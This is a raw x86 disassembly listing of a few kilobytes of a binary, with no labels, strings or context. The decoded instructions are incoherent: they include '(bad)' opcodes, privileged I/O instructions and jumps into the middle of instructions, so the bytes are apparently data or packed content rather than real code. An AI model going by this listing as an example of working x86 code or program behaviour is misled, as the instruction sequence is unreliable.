  4159a6:	or     al,BYTE PTR [esi+0x50]
  4159a9:	inc    ebp
  4159aa:	lock adc edi,DWORD PTR [edi]
  4159ad:	jae    0x41596b
  4159af:	inc    edx
  4159b0:	ds push esp
  4159b2:	mov    al,ds:0xa0200aff
  4159b7:	or     eax,0xc956663
  4159bc:	dec    edi
  4159bd:	addr16 xchg edi,eax
  4159bf:	or     DWORD PTR [ecx+0x6c],esp
  4159c2:	mov    esp,0x87543f0e
  4159c7:	clc    
  4159c8:	bound  edx,QWORD PTR [bx+di+0x3ed]
  4159cd:	push   ecx
  4159ce:	xchg   edi,eax
  4159cf:	add    DWORD PTR [eax+0x75],edx
  4159d2:	xchg   ecx,eax
  4159d3:	int    0x5e
  4159d5:	pop    esp
  4159d6:	scas   eax,DWORD PTR es:[edi]
  4159d7:	sti    
  4159d8:	bound  esp,QWORD PTR [edx+0x51]
  4159db:	add    al,0x2f
  4159dd:	inc    ecx
  4159de:	xor    eax,esi
  4159e0:	cmp    al,0x5c
  4159e2:	xor    ebp,DWORD PTR [ebx-0x6bd19cb3]
  4159e8:	xor    DWORD PTR [eax],esp
  4159ea:	or     BYTE PTR [eax],al
  4159ec:	dec    esp
  4159ed:	ins    DWORD PTR es:[edi],dx
  4159ee:	push   ebp
  4159ef:	ret    
  4159f0:	xor    eax,0x646c334f
  4159f5:	ins    DWORD PTR es:[edi],dx
  4159f6:	inc    esp
  4159f7:	mov    esi,0x7262
	...
  415a0c:	lock ins BYTE PTR es:[edi],dx
  415a0e:	fs data16 sbb al,0x91
  415a12:	bound  esi,QWORD PTR [edx+0x15]
  415a15:	les    edi,FWORD PTR [esp+ebp*2]
  415a18:	pop    es
  415a19:	jle    0x415a7d
  415a1b:	ins    BYTE PTR es:[edi],dx
  415a1c:	and    ebx,DWORD PTR [ebp-0x63d2afbe]
  415a22:	inc    eax
  415a23:	jae    0x415a29
  415a25:	jnp    0x415a62
  415a27:	push   esp
  415a28:	and    al,al
  415a2a:	sbb    DWORD PTR [eax],esp
  415a2c:	ror    BYTE PTR [ebp+0x64],0x66
  415a30:	int    0x4c
  415a32:	push   eax
  415a33:	addr16 iret 
  415a35:	push   es
  415a36:	push   ebp
  415a37:	les    ebp,FWORD PTR gs:[edx]
  415a3a:	cmp    BYTE PTR [edi-0x5c],al
  415a3d:	pop    ecx
  415a3e:	inc    esi
  415a3f:	pusha  
  415a40:	shl    BYTE PTR [edi+0x59],cl
  415a43:	add    al,0x9c
  415a45:	inc    ecx
  415a46:	push   ebx
  415a47:	arpl   dx,dx
  415a49:	addr16 dec ebx
  415a4b:	aaa    
  415a4c:	mov    cl,0x47
  415a4e:	pop    ss
  415a4f:	dec    ecx
  415a50:	les    eax,FWORD PTR [ebp+0x34]
  415a53:	pop    eax
  415a54:	xchg   ebx,eax
  415a55:	inc    eax
  415a56:	cmp    esi,DWORD PTR [eax+esi*8]
  415a59:	sub    ah,BYTE PTR [esi]
  415a5b:	pusha  
  415a5c:	popf   
  415a5d:	or     BYTE PTR fs:[eax-0x5f],ah
  415a61:	inc    ebp
  415a62:	sub    BYTE PTR [ebx+esi*4],dh
  415a65:	sub    ch,BYTE PTR [edx]
  415a67:	pop    ecx
  415a68:	jl     0x415acd
  415a6a:	and    eax,0x17274038
  415a6f:	push   esi
	...
  415a80:	add    BYTE PTR [eax],al
  415a82:	push   ebp
  415a83:	pop    es
  415a84:	or     ecx,DWORD PTR [ebx+0x4c]
  415a87:	pop    eax
  415a88:	leave  
  415a89:	fs inc esp
  415a8b:	xor    al,0xaa
  415a8d:	inc    esp
  415a8e:	and    BYTE PTR [edx-0x4d],al
  415a91:	inc    esi
  415a92:	inc    ebx
  415a93:	push   ebx
  415a94:	les    ecx,FWORD PTR [ecx+0x24]
  415a97:	aaa    
  415a98:	pop    es
  415a99:	inc    eax
  415a9a:	dec    edi
  415a9b:	push   ebx
  415a9c:	les    eax,FWORD PTR [ebx]
  415a9e:	dec    esp
  415a9f:	inc    esp
  415aa0:	mov    esp,0x93411357
  415aa5:	xor    esi,eax
  415aa7:	sub    bl,BYTE PTR [edx-0x779d39a0]
  415aad:	push   edi
  415aae:	lock xor eax,DWORD PTR [esi-0x77b00397]
  415ab5:	push   ebp
  415ab6:	adc    ebp,DWORD PTR [ebx]
  415ab8:	lods   eax,DWORD PTR ds:[esi]
  415ab9:	pop    edi
  415aba:	pop    ss
  415abb:	push   esp
  415abc:	(bad)
  415ac0:	add    BYTE PTR [ebp+0x7e5106fe],dl
  415ac6:	leave  
  415ac7:	push   edx
  415ac8:	jne    0x415b12
  415aca:	mov    esi,0xd0275c63
  415acf:	daa    
  415ad0:	jno    0x415b13
  415ad2:	mov    edx,0x6e9502e
  415ad7:	pop    edx
  415ad8:	cmp    ax,0x279b
  415adc:	jb     0x415b22
  415ade:	loopne 0x415b20
  415ae0:	ins    BYTE PTR es:[edi],dx
  415ae1:	dec    eax
  415ae2:	mov    edi,0x11465e
	...
  415af7:	add    ah,ah
  415af9:	sub    dh,BYTE PTR [ecx+ebp*8]
  415afc:	aam    0x58
  415afe:	jno    0x415b15
  415b00:	xchg   ebp,eax
  415b01:	pop    edx
  415b02:	ins    BYTE PTR es:[edi],dx
  415b03:	or     al,0x9e
  415b05:	inc    edx
  415b06:	pop    edi
  415b07:	adc    eax,0xfd5f369c
  415b0c:	fwait
  415b0d:	push   es
  415b0e:	jo     0x415b18
  415b10:	dec    eax
  415b11:	pop    edi
  415b12:	add    BYTE PTR [eax],ah
  415b14:	push   edx
  415b15:	push   esi
  415b16:	je     0x415b20
  415b18:	push   eax
  415b19:	pop    ebx
  415b1a:	and    BYTE PTR [ecx-0x1697acb4],bh
  415b20:	aaa    
  415b21:	sub    BYTE PTR [eax+ecx*8+0x39],dh
  415b25:	pop    edx
  415b26:	ins    BYTE PTR es:[edi],dx
  415b27:	lds    ecx,FWORD PTR [eax+0x55]
  415b2a:	add    BYTE PTR [ebp-0x3b8ba002],ah
  415b30:	inc    esi
  415b31:	sbb    DWORD PTR [eax+ecx*8+0x3f],esp
  415b35:	pop    es
  415b36:	pop    esp
  415b37:	cwde   
  415b38:	cmp    BYTE PTR [eax+0x61],ah
  415b3b:	xchg   edx,eax
  415b3c:	shl    DWORD PTR [edx+0x5f],1
  415b3f:	xchg   ebp,eax
  415b40:	repz sub cl,BYTE PTR [eax-0x80]
  415b44:	push   ds
  415b45:	push   ebx
  415b46:	ins    DWORD PTR es:[edi],dx
  415b47:	fwait
  415b48:	sub    al,0x19
  415b4a:	add    BYTE PTR fs:[eax+0x2f],ch
  415b4e:	add    BYTE PTR [edi+edx*4+0x27],bl
  415b52:	pop    ebp
  415b53:	jae    0x415bc6
  415b55:	cmp    eax,0xf06d5058
  415b5a:	call   FWORD PTR [ebx+0x0]
	...
  415b6d:	add    BYTE PTR [edi],al
  415b6f:	addr16 pop ebp
  415b71:	jae    0x415b14
  415b73:	cmp    al,0x58
  415b75:	push   eax
  415b76:	std    
  415b77:	out    dx,al
  415b78:	call   FWORD PTR [ebx+0x17]
  415b7b:	sub    al,0x6c
  415b7d:	adc    ebp,DWORD PTR gs:[esp+ebp*2]
  415b81:	ins    BYTE PTR es:[edi],dx
  415b82:	mov    eax,0xb0735c02
  415b87:	cs popa 
  415b89:	ins    DWORD PTR es:[edi],dx
  415b8a:	test   al,0x64
  415b8c:	pop    ebp
  415b8d:	addr16 in al,0x30
  415b90:	cs js  0x415b8f
  415b93:	data16 add BYTE PTR [ebx+ebp*8+0x5f],bl
  415b98:	pop    edi
  415b99:	jmp    FWORD PTR gs:[esi]
  415b9c:	outs   dx,DWORD PTR ds:[esi]
  415b9d:	gs sti 
  415b9f:	sub    al,0x61
  415ba1:	jb     0x415b8d
  415ba3:	call   0xb2ec91f
  415ba8:	pop    esp
  415ba9:	lock es popaw 
  415bad:	jp     0x415b6f
  415baf:	data16 ins BYTE PTR es:[edi],dx
  415bb1:	popa   
  415bb2:	call   DWORD PTR [edx+0x69]
  415bb5:	ins    BYTE PTR es:[edi],dx
  415bb6:	fsincos 
  415bb8:	push   0x66
  415bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bbb:	pop    edi
  415bbc:	pop    ebp
  415bbd:	jb     0x415b63
  415bbf:	test   BYTE PTR [ebp+0x69],0xbd
  415bc3:	sub    eax,0x66ad695a
  415bc8:	pop    ebp
  415bc9:	add    BYTE PTR [edx+0x27],bh
  415bcc:	data16 je 0x415c45
  415bcf:	sub    DWORD PTR [edx+0x65],esi
	...
  415be2:	add    BYTE PTR [eax],al
  415be4:	dec    ebp
  415be5:	push   eax
  415be6:	gs ins BYTE PTR es:[edi],dx
  415be8:	lock xchg edx,eax
  415bea:	sub    esp,DWORD PTR [edi+0xc]
  415bed:	inc    esp
  415bee:	bound  esp,QWORD PTR [eax]
  415bf0:	xor    ebx,DWORD PTR [edx+ebx*2+0x13bde63]
  415bf7:	inc    edi
  415bf8:	(bad)  
  415bf9:	inc    eax
  415bfa:	push   ebp
  415bfb:	pop    edi
  415bfc:	int3   
  415bfd:	inc    ebx
  415bfe:	xor    BYTE PTR [ecx+ecx*8+0x61],al
  415c02:	add    al,0x48
  415c04:	fbld   TBYTE PTR [eax+0x58]
  415c07:	add    BYTE PTR [ebp-0xf8d9aa0],bl
  415c0d:	jmp    DWORD PTR [eax+0x71]
  415c10:	ret    
  415c11:	scas   eax,DWORD PTR es:[edi]
  415c12:	xor    DWORD PTR [ebp-0x5e],ebp
  415c15:	sti    
  415c16:	add    edx,DWORD PTR [edx-0x73]
  415c19:	dec    edx
  415c1a:	pop    edi
  415c1b:	je     0x415bb2
  415c1d:	cmovs  esp,DWORD PTR [edi-0x5e]
  415c21:	scas   eax,DWORD PTR es:[edi]
  415c22:	xor    al,0x63
  415c24:	sbb    BYTE PTR ds:0x3d07265,0x49
  415c2b:	jo     0x415bc2
  415c2d:	scas   eax,DWORD PTR es:[edi]
  415c2e:	xor    al,0x63
  415c30:	add    ch,0x66
  415c33:	jb     0x415c53
  415c35:	clc    
  415c36:	pop    esi
  415c37:	jno    0x415c95
  415c39:	mov    al,0x34
  415c3b:	arpl   WORD PTR [edx-0x42],sp
  415c3e:	data16 jb 0x415c47
  415c41:	adc    DWORD PTR [ebx+eiz*2+0x42],0xffffffb0
  415c46:	xor    al,0x63
	...
  415c58:	add    BYTE PTR [eax],al
  415c5a:	inc    edx
  415c5b:	out    0x66,al
  415c5d:	jb     0x415c6d
  415c5f:	and    BYTE PTR [edx+0x71],0x43
  415c63:	mov    al,0x34
  415c65:	arpl   WORD PTR [edx],sp
  415c67:	jle    0x415ccf
  415c69:	jb     0x415c41
  415c6b:	lahf   
  415c6c:	pusha  
  415c6d:	jb     0x415c93
  415c6f:	mov    al,0x31
  415c71:	pop    edi
  415c72:	sbb    al,0x7
  415c74:	pop    DWORD PTR [ebx]
  415c76:	and    DWORD PTR [ecx+ebx*4],ebp
  415c79:	pop    ecx
  415c7a:	adc    edi,DWORD PTR [ecx]
  415c7c:	mov    ebx,0xe72c004a
  415c81:	aas    
  415c82:	pop    ss
  415c83:	cmp    bh,BYTE PTR [ebx+0x23]
  415c86:	shr    DWORD PTR [ebx],0x79
  415c89:	pop    ecx
  415c8a:	sar    DWORD PTR [eax],cl
  415c8c:	(bad)  
  415c8d:	cmp    ecx,ebp
  415c8f:	cmp    DWORD PTR [ebx+0x3],esi
  415c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c93:	daa    
  415c94:	pop    edx
  415c95:	pop    eax
  415c96:	adc    BYTE PTR [edx+0x44],bl
  415c99:	push   edx
  415c9a:	mov    esi,0xa324592b
  415c9f:	cmp    DWORD PTR [edx+edx*2-0x10],eax
  415ca3:	push   edx
  415ca4:	dec    eax
  415ca5:	push   ebx
  415ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca7:	out    0x19,al
  415ca9:	imul   esp,DWORD PTR [edx-0x2fadb3c4],0xa1534856
  415cb3:	push   es
  415cb4:	xor    esp,DWORD PTR [ebp-0x7f]
  415cb7:	cmp    al,bh
  415cb9:	xor    dl,BYTE PTR [ebx+0x691d38]
	...
  415ccf:	add    BYTE PTR [edx-0x7da0c91a],al
  415cd5:	cmp    ah,bh
  415cd7:	aas    
  415cd8:	dec    edi
  415cd9:	cmp    bl,dh
  415cdb:	and    eax,DWORD PTR [ecx+0x2a]
  415cde:	stc    
  415cdf:	push   ebp
  415ce0:	push   ebx
  415ce1:	cmp    edi,eax
  415ce3:	xor    esi,DWORD PTR [edi]
  415ce5:	cmp    ecx,edi
  415ce7:	add    edi,DWORD PTR [esi+eiz*1]
  415cea:	ficom  DWORD PTR [edi+0x10]
  415ced:	pop    eax
  415cee:	int3   
  415cef:	push   ecx
  415cf0:	inc    esi
  415cf1:	sub    bl,cl
  415cf3:	and    ebx,DWORD PTR [esi+edi*1]
  415cf6:	mov    bh,0x68
  415cf8:	lock dec esp
  415cfa:	xchg   ebx,eax
  415cfb:	xor    edx,eax
  415cfd:	push   esp
  415cfe:	add    al,cl
  415d00:	inc    ebp
  415d01:	sub    al,0x65
  415d03:	enter  0x323f,0x72
  415d07:	jmp    0xc991b841
  415d0c:	xor    dh,BYTE PTR [edx]
  415d0e:	imul   eax,DWORD PTR [esp+edx*1+0x21846435],0x7
  415d16:	data16 jge 0x415cdc
  415d19:	xor    ah,BYTE PTR [edi+0x7a]
  415d1c:	mov    edi,0xc77173f4
  415d21:	push   es
  415d22:	pop    esp
  415d23:	stos   DWORD PTR es:[edi],eax
  415d24:	mov    eax,0xa84c6c32
  415d29:	push   esi
  415d2a:	jb     0x415d7a
  415d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d2d:	sub    al,0x20
  415d2f:	cmp    bl,BYTE PTR [edi+0x56742c]
	...
  415d45:	add    ch,cl
  415d47:	cmp    BYTE PTR [ebx-0x17],ah
  415d4a:	or     eax,0xec355f2b
  415d4f:	hlt    
  415d50:	popa   
  415d51:	cmp    ebx,eax
  415d53:	push   es
  415d54:	push   ecx
  415d55:	mov    ?,WORD PTR ds:[edx]
  415d58:	jne    0x415d62
  415d5a:	mov    ds:0xbc2b5c27,al
  415d5f:	dec    esp
  415d60:	push   esp
  415d61:	cmp    eax,eax
  415d63:	dec    eax
  415d64:	jae    0x415d63
  415d66:	xchg   edi,eax
  415d67:	daa    
  415d68:	je     0x415d33
  415d6a:	and    edi,DWORD PTR [ecx]
  415d6c:	ins    DWORD PTR es:[edi],dx
  415d6d:	push   cs
  415d6e:	dec    esi
  415d6f:	out    0x45,eax
  415d71:	sbb    eax,0x84b6324
  415d76:	xor    eax,0x2eba0035
  415d7b:	sub    eax,0x394cd674
  415d80:	arpl   WORD PTR [ebp-0x4293c7cf],si
  415d86:	dec    eax
  415d87:	cmp    edx,DWORD PTR [eax+0x0]
  415d8a:	imul   esp,DWORD PTR [ebx+ebp*2+0x66],0xfffffff9
  415d8f:	imul   DWORD PTR [edx+0x66]
  415d92:	pop    ebp
  415d93:	pop    esp
  415d94:	pop    ebp
  415d95:	jb     0x415d43
  415d97:	repz inc ecx
  415d99:	jne    0x415e00
  415d9b:	arpl   WORD PTR [ecx+0x74],sp
  415d9e:	dec    ecx
  415d9f:	push   ebp
  415da0:	imul   ebp,DWORD PTR [edi+0x6f],0xffffffe7
  415da4:	inc    ebp
  415da5:	push   esp
  415da6:	cmp    edi,esp
  415da8:	ds ins BYTE PTR es:[edi],dx
	...
  415dba:	add    BYTE PTR [eax],al
  415dbc:	sub    BYTE PTR [esi],0x6e
  415dbf:	je     0x415d46
  415dc1:	inc    esi
  415dc2:	pop    ebp
  415dc3:	imul   esi,DWORD PTR [edi+0x7],0x5b6f6f4f
  415dca:	jae    0x415e2d
  415dcc:	stos   DWORD PTR es:[edi],eax
  415dcd:	sub    ebx,DWORD PTR [edx+eax*2+0x9]
  415dd1:	dec    ebp
  415dd2:	push   esp
  415dd3:	push   eax
  415dd4:	add    eax,0xf56c7149
  415dd9:	sub    esi,DWORD PTR [eax+eiz*1+0x9]
  415ddd:	pop    ecx
  415dde:	imul   ebp,DWORD PTR [edi-0x51],0xffffffea
  415de2:	inc    ebp
  415de3:	push   esp
  415de4:	stc    
  415de5:	test   BYTE PTR [edx+0x70],0xdd
  415de9:	pop    edi
  415dea:	imul   ebp,DWORD PTR [esi-0x16],0xa
  415dee:	dec    edi
  415def:	outs   dx,DWORD PTR ds:[esi]
  415df0:	out    dx,eax
  415df1:	pop    esi
  415df2:	jae    0x415e55
  415df4:	fld    TBYTE PTR [ebx]
  415df6:	pop    esp
  415df7:	inc    edx
  415df8:	fsub   QWORD PTR [esi]
  415dfa:	ins    BYTE PTR es:[edi],dx
  415dfb:	gs in  eax,dx
  415dfd:	div    BYTE PTR [ecx+0x6f]
  415e00:	imul   BYTE PTR [eax]
  415e02:	and    BYTE PTR [ebx-0xa],dl
  415e05:	sub    BYTE PTR [edi+esi*2-0x18],dh
  415e09:	push   esp
  415e0a:	popa   
  415e0b:	pop    esp
  415e0c:	fwait
  415e0d:	pop    ecx
  415e0e:	ins    BYTE PTR es:[edi],dx
  415e0f:	ins    BYTE PTR es:[edi],dx
  415e10:	lods   al,BYTE PTR ds:[esi]
  415e11:	pop    edx
  415e12:	push   eax
  415e13:	jb     0x415e05
  415e15:	enter  0x665c,0x10
  415e19:	push   0x35
  415e1b:	push   eax
  415e1c:	shr    BYTE PTR [ebp+ebx*2+0x67],1
	...
  415e30:	add    BYTE PTR [eax],al
  415e32:	or     eax,0x2f5c55d2
  415e37:	adc    BYTE PTR [ebp+0x67],0x7
  415e3b:	adc    BYTE PTR [eax+0x0],0x23
  415e3f:	cdq    
  415e40:	arpl   WORD PTR [edi+edi*8-0x72],si
  415e44:	dec    edi
  415e45:	arpl   WORD PTR [esi+ebp*2],bx
  415e48:	xor    DWORD PTR [esi+0x1c],eax
  415e4b:	add    BYTE PTR [ecx],0x4c
  415e4e:	sar    DWORD PTR [edx*2+0x503ccd51],1
  415e55:	addr16 iret 
  415e57:	mov    DWORD PTR [ebx+0x67],eax
  415e5a:	les    ecx,FWORD PTR [edx+0x63d95101]
  415e60:	gs jno 0x415e0f
  415e63:	push   esi
  415e64:	push   edx
  415e65:	add    BYTE PTR [ecx-0x2e8bb0b7],ch
  415e6b:	add    esp,DWORD PTR [eax+0x44]
  415e6e:	cdq    
  415e6f:	std    
  415e70:	adc    BYTE PTR [eax],al
  415e72:	(bad)  
  415e73:	inc    edi
  415e74:	pop    ebp
  415e75:	ins    BYTE PTR es:[edi],dx
  415e76:	lock sbb ebp,DWORD PTR [edi]
  415e79:	imul   edx,DWORD PTR [ecx-0x5bb9a803],0xffffffff
  415e80:	add    eax,DWORD PTR [esi-0x6f]
  415e83:	sbb    DWORD PTR [ebx+0x72],ebx
  415e86:	mov    DWORD PTR [ebx],esp
  415e88:	gs jno 0x415e51
  415e8b:	or     esp,DWORD PTR [ecx+0x74]
  415e8e:	lock neg DWORD PTR [eax+0x71]
  415e92:	pop    esp
  415e93:	adc    DWORD PTR [edx+0x77],edx
	...
  415ea6:	add    BYTE PTR [eax],al
  415ea8:	push   cs
  415ea9:	adc    al,0x61
  415eab:	je     0x415e9d
  415ead:	push   cs
  415eae:	push   0xc9074264
  415eb3:	pop    eax
  415eb4:	push   ss
  415eb5:	sub    ecx,eax
  415eb7:	push   edi
  415eb8:	lock aaa 
  415eba:	fcomp  QWORD PTR [edx+0x51]
  415ebd:	cs std 
  415ebf:	addr16 dec edi
  415ec1:	cmp    esp,edi
  415ec3:	das    
  415ec4:	cmp    al,0x3c
  415ec6:	mov    ecx,0x9b490d61
  415ecb:	xor    esi,eax
  415ecd:	push   ebp
  415ece:	mov    esi,0x883a0465
  415ed3:	push   ecx
  415ed4:	adc    esp,DWORD PTR [ebx-0x4d]
  415ed7:	push   esi
  415ed8:	add    ah,BYTE PTR ds:0x571c4586
  415ede:	out    0x5a,eax
  415ee0:	fidiv  WORD PTR ds:0x32d4627b
  415ee6:	ja     0x415f4a
  415ee8:	in     al,0x2e
  415eea:	out    0x30,eax
  415eec:	lds    ebp,FWORD PTR [eax]
  415eee:	jae    0x415f44
  415ef0:	scas   eax,DWORD PTR es:[edi]
  415ef1:	xor    al,0x4c
  415ef3:	sub    BYTE PTR [ecx-0x639aaccf],ah
  415ef9:	dec    eax
  415efa:	sub    eax,0xe7569c42
  415eff:	inc    esi
  415f00:	mov    ds:0x96614b2b,al
  415f05:	cmp    dl,BYTE PTR [eax+0x65]
  415f08:	mov    WORD PTR [ebp+0x48],ss
  415f0b:	pop    eax
	...
  415f1c:	add    BYTE PTR [eax],al
  415f1e:	pushf  
  415f1f:	push   es
  415f20:	sub    dl,BYTE PTR [esi-0x6d]
  415f23:	sub    cl,BYTE PTR [edx+ebx*2]
  415f26:	jl     0x415f57
  415f28:	or     BYTE PTR [eax-0x4f],bl
  415f2b:	cs or  al,0x67
  415f2e:	mov    DWORD PTR [esi],eax
  415f30:	cmp    bl,BYTE PTR [ebx+0x56]
  415f33:	cmp    edi,esi
  415f35:	bound  ebp,QWORD PTR fs:[edx]
  415f38:	sbb    esi,DWORD PTR [edi]
  415f3a:	dec    ebp
  415f3b:	cmp    eax,DWORD PTR [eax]
  415f3d:	or     BYTE PTR [eax],cl
  415f3f:	dec    ecx
  415f40:	inc    esi
  415f41:	daa    
  415f42:	add    BYTE PTR [edi+0x5c],dl
  415f45:	mov    dh,0x23
  415f47:	cmp    esp,DWORD PTR [edi-0x32]
  415f4a:	sbb    DWORD PTR [esi],esi
  415f4c:	add    BYTE PTR [ecx-0x298ec9b4],bh
  415f52:	dec    edx
  415f53:	xor    eax,0x35e0e964
  415f58:	arpl   WORD PTR [ebx-0x3394a027],di
  415f5e:	repz dec esi
  415f60:	ins    DWORD PTR es:[edi],dx
  415f61:	mov    edx,0x9b64003f
  415f66:	push   ds
  415f67:	pop    es
  415f68:	push   edx
  415f69:	test   BYTE PTR [eax],bl
  415f6b:	xor    dh,BYTE PTR [esp+ecx*4-0x49]
  415f6f:	daa    
  415f70:	jb     0x415f5b
  415f72:	and    esi,DWORD PTR [edx]
  415f74:	jb     0x415ff3
  415f76:	repz dec esi
  415f78:	ins    DWORD PTR es:[edi],dx
  415f79:	jp     0x415f2a
  415f7b:	push   eax
  415f7c:	pop    edi
  415f7d:	test   al,dl
  415f7f:	push   es
  415f80:	push   eax
  415f81:	jle    0x415f83
	...
  415f93:	add    BYTE PTR [ebp-0x60c3ffc6],ah
  415f99:	and    esi,DWORD PTR [edx+0x4f]
  415f9c:	aad    0x2b
  415f9e:	arpl   cx,bp
  415fa0:	add    esp,DWORD PTR [eax+0x71]
  415fa3:	pop    edx
  415fa4:	ret    
  415fa5:	xor    DWORD PTR [edx+0x4d],esi
  415fa8:	in     al,dx
  415fa9:	dec    esi
  415faa:	ins    DWORD PTR es:[edi],dx
  415fab:	cmp    al,al
  415fad:	dec    edx
  415fae:	addr16 cmp ebx,edx
  415fb1:	pop    edi
  415fb2:	imul   eax,DWORD PTR [esp+esi*8+0x55],0x6d
  415fb7:	push   fs
  415fb9:	cmp    DWORD PTR [edi+0x1b],ebx
  415fbc:	xchg   ecx,eax
  415fbd:	bound  eax,QWORD PTR [ecx+0x6]
  415fc0:	xchg   edx,eax
  415fc1:	sub    BYTE PTR [ebx+0x4],ah
  415fc4:	aaa    
  415fc5:	xor    al,0x70
  415fc7:	add    BYTE PTR [ecx-0x1a999508],bh
  415fcd:	push   esp
  415fce:	pop    ebp
  415fcf:	jb     0x415fb5
  415fd1:	out    dx,al
  415fd2:	inc    esp
  415fd3:	outs   dx,BYTE PTR ds:[esi]
  415fd4:	lds    esp,FWORD PTR [esi]
  415fd6:	jb     0x416046
  415fd8:	mov    ah,0x4f
  415fda:	pop    esp
  415fdb:	push   eax
  415fdc:	fwait
  415fdd:	pop    esp
  415fde:	imul   bp,WORD PTR [ebp+0x6a006f26],0x665c
  415fe7:	je     0x41604f
  415fe9:	sub    dh,BYTE PTR [edx+0x65]
  415fec:	jge    0x416033
  415fee:	push   esp
  415fef:	push   eax
  415ff0:	jbe    0x41601c
  415ff2:	jb     0x416059
  415ff4:	jge    0x41603e
  415ff6:	dec    ebx
  415ff7:	push   edx
	...
  416008:	add    BYTE PTR [eax],al
  41600a:	push   esp
  41600b:	inc    ebp
  41600c:	push   esp
  41600d:	push   eax
  41600e:	cmp    eax,0x647464f8
  416013:	pop    eax
  416014:	add    BYTE PTR [eax-0x12],cl
  416017:	pop    eax
  416018:	je     0x41601a
  41601a:	test   BYTE PTR [eax+0x61],bl
  41601d:	jb     0x416068
  41601f:	repz push 0x72
  416022:	aad    0x3
  416024:	push   eax
  416025:	push   edi
  416026:	pop    ecx
  416027:	repz jae 0x416092
  41602a:	or     ecx,DWORD PTR [ebx]
  41602c:	dec    edi
  41602d:	push   ebx
  41602e:	add    DWORD PTR [ebx],ecx
  416030:	jo     0x4160a4
  416032:	scas   al,BYTE PTR es:[edi]
  416033:	and    al,0x65
  416035:	ins    BYTE PTR es:[edi],dx
  416036:	mov    ah,0x59
  416038:	cs js  0x415ff7
  41603b:	pop    esi
  41603c:	add    BYTE PTR [edi+edx*8-0xa],bl
  416040:	dec    edi
  416041:	and    ah,al
  416043:	push   edx
  416044:	jo     0x4160b2
  416046:	into   
  416047:	pop    eax
  416048:	popa   
  416049:	jb     0x416064
  41604b:	cli    
  41604c:	push   0x66
  41604e:	in     eax,0x55
  416050:	pop    ebp
  416051:	jb     0x416043
  416053:	adc    ch,BYTE PTR [eax]
  416055:	inc    esi
  416056:	inc    esp
  416057:	add    BYTE PTR [ebx+eax*2],ah
  41605a:	push   0x626d55c0
  41605f:	add    edx,DWORD PTR [esi+0x5c]
  416062:	cs sbb al,0x34
  416065:	and    BYTE PTR ds:0x576c51b8,dh
  41606b:	loop   0x4160cb
  41606d:	jb     0x41606f
	...
  41607f:	add    BYTE PTR [esi*2-0x1eb48da8],bl
  416086:	push   ecx
  416087:	pop    edi
  416088:	adc    eax,ebx
  41608a:	and    eax,0x2d712e4b
  41608f:	ins    DWORD PTR es:[edi],dx
  416090:	bswap  esp
  416092:	inc    ebx
  416093:	pop    edi
  416094:	and    al,BYTE PTR [ebx]
  416096:	push   ss
  416097:	xor    al,ah
  416099:	scas   eax,DWORD PTR es:[edi]
  41609a:	inc    ebx
  41609b:	jae    0x416099
  41609d:	fwait
  41609e:	pop    eax
  41609f:	outs   dx,BYTE PTR ds:[esi]
  4160a0:	add    esi,DWORD PTR [eax-0x63f192cc]
  4160a6:	push   eax
  4160a7:	pop    edi
  4160a8:	loop   0x41602c
  4160aa:	and    eax,0x219fbc46
  4160af:	inc    ebx
  4160b0:	fdivr  DWORD PTR [edi]
  4160b2:	push   ebp
  4160b3:	ins    DWORD PTR es:[edi],dx
  4160b4:	loop   0x416040
  4160b6:	push   ebx
  4160b7:	pop    esp
  4160b8:	mov    al,ds:0xd9665841
  4160bd:	push   ebx
  4160be:	pop    ebp
  4160bf:	jno    0x4160b1
  4160c1:	jmp    DWORD PTR [eax+0x71]
  4160c4:	ret    
  4160c5:	pop    esp
  4160c6:	push   edi
  4160c7:	jb     0x41605d
  4160c9:	scas   eax,DWORD PTR es:[edi]
  4160ca:	xor    DWORD PTR [edi-0x5d],ebx
  4160cd:	add    BYTE PTR [edi+0x6d],cl
  4160d0:	mov    ds:0xa0773043,al
  4160d5:	dec    edx
  4160d6:	add    al,0x48
  4160d8:	lahf   
  4160d9:	add    BYTE PTR [eax+0x0],dl
  4160dc:	mov    ah,0x6
  4160de:	push   ss
  4160df:	popa   
  4160e0:	xchg   edi,eax
  4160e1:	sub    al,0xe7
  4160e3:	xor    eax,DWORD PTR [eax]
	...
  4160f5:	add    BYTE PTR [ebp+0x37041b38],al
  4160fb:	sub    eax,0x284f5000
  416100:	adc    esi,DWORD PTR [edi+edi*1]
  416103:	xor    ecx,DWORD PTR [edi]
  416105:	add    al,0x2e
  416107:	xor    esi,edi
  416109:	xor    al,0x57
  41610b:	xor    eax,DWORD PTR [edx+ebx*1]
  41610e:	dec    eax
  41610f:	sub    al,0xd3
  416111:	add    ebx,DWORD PTR [eax*2+0x284d5ad9]
  416118:	fistp  DWORD PTR [esi-0x1f]
  41611b:	push   es
  41611c:	std    
  41611d:	pop    edx
  41611e:	push   ss
  41611f:	xor    bh,ah
  416121:	daa    
  416122:	inc    esi
  416123:	sub    ch,cl
  416125:	aas    
  416126:	pop    ds
  416127:	xor    cl,ah
  416129:	daa    
  41612a:	xor    DWORD PTR [esi],ebp
  41612c:	mov    ebp,0xc3260f61
  416131:	xor    al,0x13
  416133:	cmp    bl,BYTE PTR [edx-0x65d2faa6]
  416139:	add    ecx,esp
  41613b:	pop    ecx
  41613c:	test   BYTE PTR [ecx+eiz*8+0x2f],dl
  416140:	xchg   esi,eax
  416141:	pop    ecx
  416142:	loope  0x41614a
  416144:	call   0xc262:0x7e32ce58
  41614b:	and    ecx,DWORD PTR [ebx+0x2b2ca731]
  416151:	dec    ebp
  416152:	leave  
  416153:	and    edi,DWORD PTR [ebx]
  416155:	xor    edx,ebx
  416157:	sub    DWORD PTR [edx+edx*2+0x0],ebx
	...
  41616b:	add    BYTE PTR [ebx-0x4efbd0bc],dl
  416171:	sub    eax,0x25975e55
  416176:	pop    es
  416177:	xor    al,0xb7
  416179:	xor    al,BYTE PTR [eax]
  41617b:	inc    ecx
  41617c:	hlt    
  41617d:	pop    ecx
  41617e:	ins    BYTE PTR es:[edi],dx
  41617f:	xor    eax,0x41465da2
  416184:	les    eax,FWORD PTR [esi]
  416186:	pop    esp
  416187:	sbb    dl,BYTE PTR [ebp+0x61a6332]
  41618d:	aas    
  41618e:	imul   edi,ebp,0xfffffff3
  416191:	pop    edx
